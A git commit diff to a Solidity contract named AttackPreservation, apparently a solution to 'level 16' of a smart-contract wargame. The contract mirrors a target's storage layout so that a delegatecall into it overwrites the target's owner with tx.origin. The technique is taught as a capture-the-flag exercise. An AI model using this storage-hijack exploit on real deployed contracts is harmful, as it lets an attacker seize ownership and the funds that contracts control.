3944c90016146602fad7bc7f6e9244e10eea44f2
Chris Parsons <chrisjamesparsons@hotmail.co.uk>
2022-05-26 14:45:35 +0100

    Fix level 16

--- contracts/16_AttackPreservation.sol
+++ contracts/16_AttackPreservation.sol
@@ -9,7 +9,7 @@ interface IPreservation {
   function setSecondTime(uint _timeStamp) external;
 }
 
-// Point the timeZone1Library address to this contract
+// Point the timeZone1Library address to this contract by calling setSecondTime
 contract AttackPreservation {
     address public timeZone1Library;
     address public timeZone2Library;
@@ -17,7 +17,7 @@ contract AttackPreservation {
     constructor() public {}
 
     // underhand claim level
-    function setFirstTime(uint _timeStamp) public {
-        owner = address(_timeStamp);
+    function setTime(uint _timeStamp) public {
+        owner = tx.origin;
     }
 }
